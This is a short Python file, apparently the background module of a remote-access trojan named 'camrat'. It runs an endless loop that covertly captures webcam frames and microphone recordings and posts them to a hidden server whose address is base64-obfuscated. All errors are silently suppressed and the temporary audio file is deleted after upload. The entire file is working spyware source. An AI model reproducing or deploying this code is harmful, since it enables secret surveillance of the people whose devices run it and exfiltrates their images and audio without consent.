# camrat/background.py
import cv2
import sounddevice as sd
import soundfile as sf
import requests
import base64
import os
import time

SERVER = base64.b64decode("aHR0cDovLzE3Mi4yMC4xMC4yOjUwMDA=").decode()  # http://172.20.10.2:5000

def send_frame():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if ret:
            _, img = cv2.imencode('.jpg', frame)
            requests.post(SERVER + "/stream", data=img.tobytes(),
                          headers={"Content-Type": "application/octet-stream"})
    except: pass

def record_audio():
    try:
        fs = 44100
        dur = 5
        audio = sd.rec(int(fs*dur), samplerate=fs, channels=1)
        sd.wait()
        path = "/sdcard/mic.wav"
        sf.write(path, audio, fs)
        with open(path, 'rb') as f:
            requests.post(SERVER + "/audio", data=f.read(),
                          headers={"Content-Type": "application/octet-stream"})
        os.remove(path)
    except: pass

while True:
    send_frame()
    record_audio()
    time.sleep(10)